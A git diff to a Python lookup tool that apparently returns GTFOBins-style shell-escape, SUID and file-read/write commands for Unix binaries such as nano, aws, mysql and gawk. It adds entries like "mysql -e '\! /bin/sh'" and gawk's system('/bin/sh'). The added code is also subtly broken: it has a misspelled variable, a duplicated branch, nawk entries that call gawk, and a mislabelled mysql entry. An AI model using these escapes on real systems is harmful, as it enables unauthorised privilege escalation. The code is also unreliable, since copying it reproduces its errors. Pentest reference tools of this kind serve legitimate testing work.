@@ -24,7 +24,7 @@ ________  ________ ________              ________  ________  ___  ________
     '''
 
 for col in logo:
-    print(color(col, colors.CRED), end="")
+    print(color(col, colors.CCYAN), end="")
 print() 
 
 #Function for gtfo_bins that will hold the different commands and responses
@@ -228,13 +228,13 @@ def gtfo_bins(gtfo_command, gtfo_options):
 
     elif gtfo_command == "nano":
         if gtfo_options == "shell":
-            bins.append(r"nano\n^R^X\nreset; sh 1>&0 2>&0")
+            bins.append("nano\n^R^X\nreset; sh 1>&0 2>&0")
         elif gtfo_options == "sudo":
-            bins.append(r"sudo nano\n^R^X\nreset; sh 1>&0 2>&0")
+            bins.append("sudo nano\n^R^X\nreset; sh 1>&0 2>&0")
         elif gtfo_options == "suid":
-            bins.append(r"./nano -s /bin/sh\n/bin/sh\n^T")
+            bins.append("./nano -s /bin/sh\n/bin/sh\n^T")
         elif gtfo_options == "file-write":
-            bins.append(r"nano file_to_write\nDATA\n^O")
+            bins.append("nano file_to_write\nDATA\n^O")
         elif gtfo_options == "file-read":
             bins.append("nano file_to_read")
 
@@ -502,15 +502,15 @@ def gtfo_bins(gtfo_command, gtfo_options):
 
     elif gtfo_command == "aws":
         if gtfo_options == "shell":
-            bins.append(r"aws help\n!/bin/sh")
+            bins.append("aws help\n!/bin/sh")
         elif gtfo_options == "sudo":
-            bins.append(r"sudo aws help\n!/bin/sh")
+            bins.append("sudo aws help\n!/bin/sh")
         elif gtfo_options == "file-read":
             bins.append("aws s3 cp s3://bucket-name/file.txt .")
         elif gtfo_options == "file-write":
             bins.append("aws s3 cp /local/directory s3://your-bucket-name/directory --recursive")
         elif gtfo_options == "suid":
-            bins.append(r"sudo install -m =xs $(which aws) .\naws help\n!/bin/sh")
+            bins.append("sudo install -m =xs $(which aws) .\naws help\n!/bin/sh")
 
     elif gtfo_command == "base58":
         if gtfo_options == "sudo":
@@ -2504,6 +2504,53 @@ def gtfo_bins(gtfo_command, gtfo_options):
         elif gtfo_options == "shell":
             bins.append("N/A")
 
+    elif gtfo_command == "mypy":
+        if gtfo_options == "file-write":
+            bins.append("mypy /path/to/input-file --junit-xml /path/to/output-file")
+        elif gtfo_optons == "file-read":
+            bins.append("mypy /path/to/input-file")
+        elif gtfo_options == "sudo":
+            bins.append("N/A")
+        elif gtfo_options == "suid":
+            bins.append("N/A")
+        elif gtfo_options == "shell":
+            bins.append("N/A")
+
+    elif gtfo_command == "mysql":
+        if gtfo_options == "shell":
+            bins.append("mysql -e '\! /bin/sh'")
+        elif gtfo_options == "file-write":
+            bins.append("mysql --default-auth ../../../../../path/to/lib")
+        elif gtfo_options == "file-read":
+            bins.append("N/A")
+        elif gtfo_options == "sudo":
+            bins.append("N/A")
+        elif gtfo_options == "suid":
+            bins.append("N/A")
+
+    elif gtfo_command == "nasm":
+        if gtfo_options == "file-read":
+            bins.append("nasm -@ /path/to/input-file")
+        elif gtfo_options == "sudo":
+            bins.append("N/A")
+        elif gtfo_options == "suid":
+            bins.append("N/A")
+        elif gtfo_options == "file-write":
+            bins.append("N/A")
+        elif gtfo_options == "file-write":
+            bins.append("N/A")
+
+    elif gtfo_command == "nawk":
+        if gtfo_options == "shell":
+            bins.append("gawk '"'BEGIN {system("/bin/sh")}'"'")
+        elif gtfo_options == "file-write":
+            bins.append("gawk '"'BEGIN { print "DATA" > "/path/to/output-file" }'"'")
+        elif gtfo_options == "file-read":
+            bins.append("gawk '//' /path/to/input-file")
+        elif gtfo_options == "sudo":
+            bins.append("N/A")
+        elif gtfo_options == "suid":
+            bins.append("N/A")
 
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
@@ -2547,7 +2594,7 @@ def main():
         "ltrace", "lp", "lua", "lualatex", "luatex", "lwp-download", "lwp-request",
         "mail", "make", "man", "mawk", "minicom", "more", "mosquitto", "mount",
         "msfconsole", "msgattrib", "msgcat", "msgconv", "msgfilter", "msgmerge",
-        "msguniq", "mtr", "multitime", "mutt", "mv", "other",
+        "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk", "other",
     }
 
     if start in ALLOWED:
